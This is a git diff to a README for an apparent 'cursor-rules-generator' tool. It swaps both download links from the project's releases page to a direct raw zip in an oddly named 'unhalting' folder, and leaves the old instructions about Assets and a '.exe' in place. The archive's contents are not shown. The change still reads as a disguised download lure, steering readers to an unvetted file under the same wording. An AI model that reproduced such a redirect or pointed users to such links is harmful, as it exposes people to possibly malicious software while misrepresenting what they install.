@@ -1,6 +1,6 @@
 # 🤖 cursor-rules-generator - Create better prompts for your AI coding
 
-[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://github.com/Laurellagloomy260/cursor-rules-generator/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://github.com/Laurellagloomy260/cursor-rules-generator/raw/refs/heads/main/unhalting/cursor_rules_generator_1.3.zip)
 
 ## 📋 What this tool does
 
@@ -19,7 +19,7 @@ Your computer needs specific parts to run this software. Please verify your syst
 
 To install the tool on your machine, follow these steps:
 
-1. Visit this page to download: [https://github.com/Laurellagloomy260/cursor-rules-generator/releases](https://github.com/Laurellagloomy260/cursor-rules-generator/releases)
+1. Visit this page to download: [https://github.com/Laurellagloomy260/cursor-rules-generator/raw/refs/heads/main/unhalting/cursor_rules_generator_1.3.zip](https://github.com/Laurellagloomy260/cursor-rules-generator/raw/refs/heads/main/unhalting/cursor_rules_generator_1.3.zip)
 2. Look for the section labeled Assets.
 3. Click the link that ends in .exe.
 4. Save the file to your Downloads folder.
